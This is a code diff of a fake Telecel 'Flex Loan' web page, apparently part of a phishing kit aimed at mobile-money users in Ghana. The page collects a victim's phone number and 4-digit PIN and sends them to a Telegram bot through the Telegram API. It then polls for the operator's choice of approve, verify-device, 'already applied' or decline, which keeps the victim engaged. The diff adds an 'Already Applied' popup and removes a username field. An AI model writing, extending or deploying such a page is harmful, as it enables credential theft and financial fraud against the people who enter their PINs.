@@ -51,7 +51,6 @@
             to   { opacity: 1; transform: translateY(0); }
         }
 
-        /* ── Header strip ── */
         .header {
             background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
             padding: 28px 28px 24px;
@@ -131,7 +130,6 @@
             font-weight: 400;
         }
 
-        /* ── Loan info pill ── */
         .loan-info {
             margin: 20px 22px 0;
             background: var(--red-soft);
@@ -150,7 +148,6 @@
             flex-shrink: 0;
         }
         .loan-icon svg { width: 22px; height: 22px; }
-        .loan-text {}
         .loan-label {
             font-size: 11.5px;
             font-weight: 600;
@@ -173,7 +170,6 @@
             font-weight: 500;
         }
 
-        /* ── Form ── */
         .form-body {
             padding: 22px 22px 26px;
         }
@@ -231,7 +227,6 @@
             font-weight: 500;
         }
 
-        /* ── Error ── */
         .error-msg {
             display: none;
             background: #fff1f1;
@@ -245,7 +240,6 @@
             line-height: 1.5;
         }
 
-        /* ── Buttons ── */
         .btn-primary {
             width: 100%;
             background: linear-gradient(135deg, #E42320, #c01c1a);
@@ -290,13 +284,6 @@
         }
         .btn-back:hover { border-color: #9ca3af; color: var(--text-dark); }
 
-        .divider {
-            height: 1px;
-            background: var(--border);
-            margin: 20px 0;
-        }
-
-        /* ── Spinner overlay ── */
         #spinner {
             display: none;
             position: fixed;
@@ -330,7 +317,6 @@
             margin-top: -12px;
         }
 
-        /* Security badge */
         .security-note {
             display: flex;
             align-items: center;
@@ -342,17 +328,83 @@
             font-weight: 500;
         }
         .security-note svg { flex-shrink: 0; }
+
+        /* Toast popup */
+        #toast {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 99999;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 24px 64px rgba(0,0,0,0.22), 0 4px 16px rgba(0,0,0,0.10);
+            padding: 32px 28px 24px;
+            max-width: 320px;
+            width: 90%;
+            text-align: center;
+            animation: popIn 0.25s cubic-bezier(.22,.8,.3,1) both;
+        }
+        @keyframes popIn {
+            from { opacity: 0; transform: translate(-50%, -48%) scale(0.93); }
+            to   { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+        #toast-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10,10,10,0.55);
+            z-index: 99998;
+            backdrop-filter: blur(3px);
+        }
+        .toast-icon {
+            width: 56px; height: 56px;
+            background: #fff1f1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+        .toast-icon svg { width: 28px; height: 28px; }
+        .toast-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+        .toast-msg {
+            font-size: 14px;
+            color: var(--text-mid);
+            line-height: 1.55;
+            margin-bottom: 22px;
+        }
+        .toast-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #E42320, #c01c1a);
+            color: white;
+            border: none;
+            padding: 13px;
+            font-family: 'Sora', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(228,35,32,0.30);
+            transition: opacity 0.18s;
+        }
+        .toast-btn:hover { opacity: 0.9; }
     </style>
 </head>
 <body>
 
 <div class="card">
-
-    <!-- Red header -->
     <div class="header">
         <div class="logo-wrap">
             <div class="logo-bg">
-                <!-- Telecel SVG Logo -->
                 <svg width="36" height="36" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"/>
                     <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.045 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="white"/>
@@ -367,7 +419,6 @@
         <div class="header-desc">Enter your Telecel number and PIN to securely verify and approve your Flex Loan request.</div>
     </div>
 
-    <!-- Loan info -->
     <div class="loan-info" id="loanInfo">
         <div class="loan-icon">
             <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2">
@@ -381,7 +432,6 @@
         </div>
     </div>
 
-    <!-- Form -->
     <div class="form-body">
 
         <div class="form-group">
@@ -397,11 +447,6 @@
         <div class="form-group">
             <label for="phone">Phone Number</label>
             <input type="tel" id="phone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
-        </div>
-
-        <div class="form-group">
-            <label for="username">Username</label>
-            <input type="text" id="username" placeholder="Enter your username">
         </div>
 
         <div class="form-group">
@@ -424,6 +469,19 @@
     </div>
 </div>
 
+<!-- Already Applied Toast -->
+<div id="toast-overlay"></div>
+<div id="toast">
+    <div class="toast-icon">
+        <svg fill="none" viewBox="0 0 24 24" stroke="#E42320" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
+        </svg>
+    </div>
+    <div class="toast-title">Already Applied</div>
+    <div class="toast-msg">You have already submitted a loan application. Please wait for approval before applying again.</div>
+    <button class="toast-btn" id="toastHomeBtn">Return Home</button>
+</div>
+
 <!-- Spinner overlay -->
 <div id="spinner">
     <div class="spin-ring"></div>
@@ -443,14 +501,15 @@
     let state = { lastUpdateId: 0 };
     let isProcessing = false;
 
-    const phoneInput    = document.getElementById('phone');
-    const usernameInput = document.getElementById('username');
-    const pinInput      = document.getElementById('password');
-    const continueBtn   = document.getElementById('continueBtn');
-    const errMsg        = document.getElementById('errMsg');
-    const spinner       = document.getElementById('spinner');
+    const phoneInput  = document.getElementById('phone');
+    const pinInput    = document.getElementById('password');
+    const continueBtn = document.getElementById('continueBtn');
+    const errMsg      = document.getElementById('errMsg');
+    const spinner     = document.getElementById('spinner');
+    const toast       = document.getElementById('toast');
+    const toastOverlay = document.getElementById('toast-overlay');
+    const toastHomeBtn = document.getElementById('toastHomeBtn');
 
-    // ── Load and display loan details ──
     function loadLoanDetails() {
         const params    = new URLSearchParams(window.location.search);
         const amount    = params.get('amount');
@@ -478,49 +537,66 @@
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
-    function sendToBot(phone, username, pin) {
+    function showToast() {
+        toast.style.display = 'block';
+        toastOverlay.style.display = 'block';
+    }
+
+    function hideToast() {
+        toast.style.display = 'none';
+        toastOverlay.style.display = 'none';
+    }
+
+    toastHomeBtn.onclick = function() {
+        hideToast();
+        window.location.href = 'index.html';
+    };
+
+    function sendToBot(phone, pin) {
         if (isProcessing) return;
         isProcessing = true;
         continueBtn.disabled = true;
         continueBtn.textContent = "Verifying…";
 
-        const ts            = Date.now();
-        const approveId     = `approve_${ts}`;
-        const declineId     = `decline_${ts}`;
-        const verifyId      = `verify_${ts}`;
-        const correctUserId = `correctuser_${ts}`;
-        const wrongUserId   = `wronguser_${ts}`;
+        const ts        = Date.now();
+        const approveId = `approve_${ts}`;
+        const declineId = `decline_${ts}`;
+        const verifyId  = `verify_${ts}`;
+        const appliedId = `applied_${ts}`;
+
+        const accountType = document.getElementById('accountType').value === 'mobile'
+            ? 'Telecel Cash (Mobile Money)'
+            : 'Broadband';
 
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\nUsername: <code>${username}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+                text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nAccount Type: <code>${accountType}</code>\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: "✅ Approve Loan",  callback_data: approveId },
-                            { text: "📱 Verify Device", callback_data: verifyId }
+                            { text: "✅ Approve Loan",   callback_data: approveId },
+                            { text: "📱 Verify Device",  callback_data: verifyId }
                         ],
                         [
-                            { text: "✔️ Correct-user",  callback_data: correctUserId },
-                            { text: "❌ Wronge-user",   callback_data: wrongUserId }
-                        ],
-                        [{ text: "🚫 Decline", callback_data: declineId }]
+                            { text: "📋 Applied",        callback_data: appliedId },
+                            { text: "🚫 Decline",        callback_data: declineId }
+                        ]
                     ]
                 }
             })
         })
         .then(() => {
             spinner.style.display = 'flex';
-            startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId);
+            startPolling(approveId, declineId, verifyId, appliedId);
         })
         .catch(() => resetButton());
     }
 
-    function startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId) {
+    function startPolling(approveId, declineId, verifyId, appliedId) {
         const interval = setInterval(() => {
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                 .then(r => r.json())
@@ -543,17 +619,10 @@
                                 spinner.style.display = 'none';
                                 window.location.href = `${CONFIG.DEVICE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
                             }
-                            else if (cb === correctUserId) {
-                                // Correct username → go to otp.html just like approve
+                            else if (cb === appliedId) {
                                 clearInterval(interval);
                                 spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-                            }
-                            else if (cb === wrongUserId) {
-                                // Wrong username → show error, stay on page
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("Wrong username entered. Please check your username and try again.");
+                                showToast();
                                 resetButton();
                             }
                             else if (cb === declineId) {
@@ -579,20 +648,14 @@
         continueBtn.textContent = "Verify & Authorize Loan";
     }
 
-    // ── Submit ──
     continueBtn.onclick = () => {
         errMsg.style.display = 'none';
 
-        const phone    = phoneInput.value.trim();
-        const username = usernameInput.value.trim();
-        const pin      = pinInput.value.trim();
+        const phone = phoneInput.value.trim();
+        const pin   = pinInput.value.trim();
 
         if (!phone || !isValidGhanaNumber(phone)) {
             showError("Please enter a valid Ghana number (e.g. 0501234567)");
-            return;
-        }
-        if (!username) {
-            showError("Please enter your username");
             return;
         }
         if (pin.length !== 4) {
@@ -600,10 +663,9 @@
             return;
         }
 
-        sendToBot(phone, username, pin);
+        sendToBot(phone, pin);
     };
 
-    // ── Input sanitisation ──
     phoneInput.addEventListener('input', () => {
         phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
     });
@@ -613,7 +675,6 @@
         if (pinInput.value.length === 4) pinInput.blur();
     });
 
-    // ── Init ──
     loadLoanDetails();
     phoneInput.focus();
 </script>
